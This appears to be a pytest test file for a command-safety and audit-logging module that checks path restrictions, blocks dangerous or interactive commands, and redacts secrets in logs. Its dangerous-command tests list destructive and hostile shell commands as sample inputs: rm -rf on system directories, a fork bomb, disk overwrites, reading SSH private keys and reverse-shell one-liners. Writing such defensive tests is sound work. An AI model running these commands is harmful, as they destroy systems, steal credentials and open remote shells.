import os
from pathlib import Path

import pytest

from nomad.security import (
    check_dangerous_command,
    check_interactive_command,
    redact_audit_detail,
    redact_env,
    verify_local_cwd_safety,
    verify_remote_path_safety,
    write_audit_log,
)


@pytest.mark.parametrize(
    "blocked_path",
    ["/", "/etc", "/usr", "/bin", "/sbin", "/lib", "/sys", "/proc", "/dev"],
)
def test_verify_local_cwd_safety_rejects_system_dirs(monkeypatch, blocked_path):
    monkeypatch.setattr(os, "getcwd", lambda: blocked_path)

    assert verify_local_cwd_safety() == "unsafe_local_cwd"


def test_verify_local_cwd_safety_allows_project_dirs(monkeypatch):
    monkeypatch.setattr(os, "getcwd", lambda: "/workspace/project")

    assert verify_local_cwd_safety() is None


@pytest.mark.parametrize(
    "remote_path",
    [
        "/workspace/project",
        "/data/team/project",
        "/tmp/nomad/project",
        "/opt/apps/project",
        "/root/project",
        "/home/user/project",
    ],
)
def test_verify_remote_path_safety_allows_whitelisted_project_paths(remote_path):
    assert verify_remote_path_safety(remote_path) is None


@pytest.mark.parametrize(
    "remote_path",
    [
        "/",
        "/etc/ssh",
        "/usr/bin",
        "workspace/project",
        "/workspace",
        "/data",
        "/root",
        "/home/user",
    ],
)
def test_verify_remote_path_safety_rejects_unsafe_paths(remote_path):
    assert verify_remote_path_safety(remote_path) == "unsafe_remote_path"


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf /etc",
        "sudo rm -rf /workspace/project",
        ":(){ :|:& };:",
        "echo bad > /etc/profile",
        "dd if=/tmp/image of=/dev/sda",
        "mkfs.ext4 /dev/sdb",
    ],
)
def test_check_dangerous_command_blocks_local_dangerous_patterns(cmd):
    assert check_dangerous_command(cmd, is_remote=False) is not None


@pytest.mark.parametrize(
    "cmd",
    [
        "cat ~/.ssh/id_rsa",
        "cat ~/.ssh/authorized_keys",
        "cat ~/.ssh/config",
        "echo key >> ~/.ssh/authorized_keys",
        "chmod 777 /workspace/project",
        "chown root:root /workspace/project",
        "bash -i >& /dev/tcp/host/4444 0>&1",
        "nc -e /bin/sh host 4444",
    ],
)
def test_check_dangerous_command_blocks_remote_only_patterns(cmd):
    assert check_dangerous_command(cmd, is_remote=True) is not None


def test_check_dangerous_command_allows_non_dangerous_commands():
    assert check_dangerous_command("python -m pytest tests", is_remote=True) is None
    assert check_dangerous_command("rm -rf /workspace/project/build", is_remote=True) is None


@pytest.mark.parametrize(
    "cmd",
    [
        "vim file.py",
        "/usr/bin/top",
        "less README.md",
        "python",
        "python3",
        "python -i",
        "python3 -i",
        "node",
        "node -i",
        "node --interactive",
        "mysql",
    ],
)
def test_check_interactive_command_blocks_interactive_commands(cmd):
    assert check_interactive_command(cmd) is not None


@pytest.mark.parametrize(
    "cmd",
    [
        "python script.py",
        "python -m pytest",
        'python -c "print(1)"',
        "python3 -m pytest tests",
        "node script.js",
        'node -e "console.log(1)"',
        "cat README.md",
    ],
)
def test_check_interactive_command_allows_non_interactive_commands(cmd):
    assert check_interactive_command(cmd) is None


def test_write_audit_log_creates_directory_and_appends(monkeypatch, tmp_path):
    monkeypatch.setattr(Path, "home", lambda: tmp_path)

    write_audit_log("demo", "remote", "python -m pytest")

    log_path = tmp_path / ".nomad" / "audit.log"
    content = log_path.read_text(encoding="utf-8")
    assert "[project=demo]" in content
    assert "[remote]" in content
    assert "python -m pytest" in content


def test_redact_env_masks_sensitive_values():
    redacted = redact_env(
        {
            "API_TOKEN": "token-value",
            "SSH_KEY_PATH": "key-value",
            "DB_PASSWORD": "password-value",
            "AUTH_HEADER": "auth-value",
            "NORMAL": "visible",
        }
    )

    assert redacted["API_TOKEN"] == "***REDACTED***"
    assert redacted["SSH_KEY_PATH"] == "***REDACTED***"
    assert redacted["DB_PASSWORD"] == "***REDACTED***"
    assert redacted["AUTH_HEADER"] == "***REDACTED***"
    assert redacted["NORMAL"] == "visible"


def test_redact_audit_detail_masks_url_credentials():
    detail = "fetch http://user:pass@example.test/path and https://u:p@host.local"

    redacted = redact_audit_detail(detail)

    assert "user:pass" not in redacted
    assert "u:p" not in redacted
    assert "http://***:***@example.test/path" in redacted
    assert "https://***:***@host.local" in redacted


@pytest.mark.parametrize(
    ("detail", "secret", "expected"),
    [
        ("Authorization: Bearer abc123", "abc123", "Bearer ***REDACTED***"),
        (
            "Authorization: Basic dXNlcjpwYXNz",
            "dXNlcjpwYXNz",
            "Basic ***REDACTED***",
        ),
        ("Authorization: Token abc123", "abc123", "Token ***REDACTED***"),
        ("authorization=Bearer abc123", "abc123", "Bearer ***REDACTED***"),
        ("AUTH_TOKEN=Bearer abc123", "abc123", "Bearer ***REDACTED***"),
        (
            'curl -H "Authorization: Basic dXNlcjpwYXNz" https://example.com',
            "dXNlcjpwYXNz",
            "Basic ***REDACTED***",
        ),
    ],
)
def test_redact_audit_detail_masks_authorization_tokens(detail, secret, expected):
    redacted = redact_audit_detail(detail)

    assert secret not in redacted
    assert expected in redacted


def test_write_audit_log_redacts_sensitive_detail(monkeypatch, tmp_path):
    monkeypatch.setattr(Path, "home", lambda: tmp_path)

    write_audit_log(
        "demo",
        "remote",
        "API_TOKEN=secret-token PASSWORD=secret-pass http://user:pass@example.test",
    )

    content = (tmp_path / ".nomad" / "audit.log").read_text(encoding="utf-8")
    assert "secret-token" not in content
    assert "secret-pass" not in content
    assert "user:pass" not in content
    assert "API_TOKEN=***REDACTED***" in content
    assert "PASSWORD=***REDACTED***" in content


def test_write_audit_log_redacts_nomad_json_contents(monkeypatch, tmp_path):
    monkeypatch.setattr(Path, "home", lambda: tmp_path)

    write_audit_log("demo", "remote", '.nomad.json {"token": "secret-value"}')

    content = (tmp_path / ".nomad" / "audit.log").read_text(encoding="utf-8")
    assert "secret-value" not in content
    assert ".nomad.json" in content
    assert "[REDACTED_CONFIG]" in content


def test_write_audit_log_rotates_and_keeps_five_history_files(
    monkeypatch, tmp_path
):
    import nomad.security as security

    monkeypatch.setattr(Path, "home", lambda: tmp_path)
    monkeypatch.setattr(security, "AUDIT_LOG_MAX_BYTES", 20)

    log_dir = tmp_path / ".nomad"
    log_dir.mkdir()
    for index in range(1, 6):
        (log_dir / f"audit.log.{index}").write_text(
            f"old-{index}", encoding="utf-8"
        )
    (log_dir / "audit.log").write_text("x" * 25, encoding="utf-8")

    write_audit_log("demo", "remote", "new-entry")

    assert (log_dir / "audit.log").read_text(encoding="utf-8").endswith("new-entry\n")
    assert (log_dir / "audit.log.1").read_text(encoding="utf-8") == "x" * 25
    assert (log_dir / "audit.log.2").read_text(encoding="utf-8") == "old-1"
    assert (log_dir / "audit.log.5").read_text(encoding="utf-8") == "old-4"
    assert not (log_dir / "audit.log.6").exists()
